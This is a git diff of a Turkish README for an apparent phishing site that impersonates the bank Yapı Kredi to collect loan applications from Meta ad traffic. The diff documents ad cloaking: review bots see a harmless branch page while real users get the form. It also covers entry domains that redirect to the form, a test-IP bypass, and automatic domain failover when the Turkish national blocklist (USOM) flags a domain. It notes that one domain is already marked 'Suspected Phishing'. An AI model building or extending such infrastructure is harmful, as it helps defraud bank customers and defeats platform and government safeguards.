@@ -25,7 +25,9 @@ Manuel deploy:
 npm run deploy
 ```
 
-- Başvuru: https://yapikredi.online (veya aktif failover domain)
+- Başvuru formu: https://yapikredi.online
+- Reklam / giriş URL (önerilen): https://kredifirsatlari.org veya https://ekonomikbakis.org
+  - Offer geçince otomatik `yapikredi.online`’a yönlendirilir (`fbclid` korunur)
 - CRM (yalnızca workers.dev): https://ykb-basvuru.s2cibaba.workers.dev/crm
   - Kök URL (`/`) otomatik `/crm`'e yönlendirilir
   - Custom domainlerde `/crm` kapalıdır (404)
@@ -36,11 +38,37 @@ Kod label: `905f76cb54ba11e58354308b3ad3eae2` — paneldeki flow ile eşleşmeli
 
 | Panel ayarı | Değer |
 |-------------|-------|
-| White page | `https://yapikredi.online/subeler.html` (veya aktif domain) |
-| Offer page | Aktif landing URL (ör. `https://yapikredi.online/`) |
-| Offer mode | Aynı domain (redirect değil) |
+| White page | `subeler.html` |
+| White mode | **Loading** |
+| Offer page | `basvuru.html` veya `https://yapikredi.online/` |
+| Offer mode | Giriş domainde **Loading** yeterli (kod offer’da otomatik redirect yapar) |
 
-**Reklam öncesi test:** Doğrudan URL ile girince çoğu trafik **white** (şube sayfası) görür — bu normal. Offer testi için Cloaking.House'ta IP whitelist veya aktif domain + `?fbclid=test` kullan. workers.dev üzerinden başvuru testi yapma; CRM içindir.
+### Giriş domain → form domain
+
+| Rol | Domain |
+|-----|--------|
+| Reklam URL (giriş) | `kredifirsatlari.org`, `ekonomikbakis.org` |
+| Form (offer host) | `yapikredi.online` |
+
+Worker vars: `OFFER_HOST=yapikredi.online`, `ENTRY_HOSTS=kredifirsatlari.org,ekonomikbakis.org`
+
+**Meta reklam hedef URL:** giriş domain (ör. `https://kredifirsatlari.org/`). Bot white görür; kullanıcı offer → `yapikredi.online/?fbclid=...`.
+
+Cloudflare’de `basvuru.html` yalnızca CH uyumluluğu için `/`’e yönlendirir.
+
+#### CH `black_ip` ve test
+
+`black_ip` CH'nin **otomatik** küresel IP veritabanıdır — panelde silinecek liste yok. Kendi IP'n test trafiğinden işaretlenmiş olabilir.
+
+**Bizim çözüm:** Worker secret `CLOAK_TEST_IPS` (virgülle IP) — CH bypass, offer görürsün. Production'da `88.255.216.16` eklendi.
+
+**CH panel (Filtering adımı):** "Allowed IPs" alanına test IP ekle veya Black IP filtresini kapat.
+
+**Kampanya / Meta URL:** giriş domain (ör. `https://kredifirsatlari.org/`) — doğrudan `yapikredi.online` değil.
+
+Mobil teşhis: `https://yapikredi.online/api/cloak/check` → `filter_type`, `client_ip`, `usom_blocked`.
+
+**Türkiye engeli:** USOM listesinde `yapikredi.online` **yok**. White görmen domain yasağı değil, CH filtresi.
 
 ### Ortam değişkenleri
 
@@ -52,37 +80,46 @@ Kod label: `905f76cb54ba11e58354308b3ad3eae2` — paneldeki flow ile eşleşmeli
 | `SUPABASE_SERVICE_ROLE_KEY` | Supabase service role (secret) |
 | `META_PIXEL_ID` | Meta dataset ID |
 | `META_CAPI_ACCESS_TOKEN` | Meta CAPI token (secret) |
+| `CRON_SECRET` | USOM cron Bearer token (secret) |
+| `CLOAK_TEST_IPS` | Opsiyonel: test IP'leri (virgülle), CH bypass |
+| `OFFER_HOST` | Form domaini (varsayılan `yapikredi.online`) |
+| `ENTRY_HOSTS` | Reklam giriş domainleri (virgülle) |
 
-KV binding: `APP_STORE` (Supabase yoksa fallback)
+KV binding: `APP_STORE` (failover cache: `active_hostname`, `blocked_hostnames`)
 
 ### USOM failover
 
 - CRM → **USOM / Domain**: kontrol, otomatik failover toggle, Telegram test, failover geçmişi
 - Cron (30 dk): GitHub Actions `.github/workflows/usom-cron.yml` — repo secret `CRON_SECRET` gerekli
-- Yedek domainler: `kredibasvuru.org`, `kredifirsatlari.org`, `ekonomikbakis.org`
+- Yedek domainler (failover sırası): `kredifirsatlari.org`, `ekonomikbakis.org`
+- `kredibasvuru.org` worker’a bağlı ama Cloudflare **Suspected Phishing** block — failover zincirinde kullanılmaz
 
-**Yedek domain Cloudflare bağlama** (zone Dashboard'dan eklendikten sonra):
+**Yedek domain Cloudflare bağlama:**
 
 ```bash
 CLOUDFLARE_API_TOKEN=... CLOUDFLARE_ACCOUNT_ID=... SPACESHIP_API_KEY=... SPACESHIP_API_SECRET=... \
-  npm run domains:onboard -- kredibasvuru.org kredifirsatlari.org ekonomikbakis.org
+  npm run domains:onboard -- kredifirsatlari.org ekonomikbakis.org
 ```
 
 Sonra `wrangler.jsonc` routes'a apex+www ekle ve `npm run deploy`.
 
 Subdomain failover (`v1.domain.org`) için `scripts/onboard-domains.mjs` ile tek hostname Worker'a bağlanır.
 
+Manuel USOM tetikleme (production):
+
+```bash
+curl -fsS "https://ykb-basvuru.s2cibaba.workers.dev/api/cron/usom-check" \
+  -H "Authorization: Bearer $CRON_SECRET"
+```
+
 ### Supabase migration
 
-Service role key **DDL çalıştıramaz** (sadece Data API). Tabloları oluşturmak için:
+Proje: `https://fbwjqqstvnviifpeywzt.supabase.co`
 
-1. **SQL editör** (tek seferlik): [SQL Editor](https://supabase.com/dashboard/project/lgjwhkhrtxsvydgwqphz/sql/new) → `supabase/migrations/001_initial.sql` içeriğini yapıştır → Run
-
+1. **MCP / SQL editör:** `supabase/migrations/001_initial.sql` ve `002_failover.sql`
 2. **CLI** (database password ile):
 
 ```bash
 $env:SUPABASE_DB_PASSWORD="your-db-password"
 npm run db:migrate
 ```
-
-Proje: `https://lgjwhkhrtxsvydgwqphz.supabase.co`
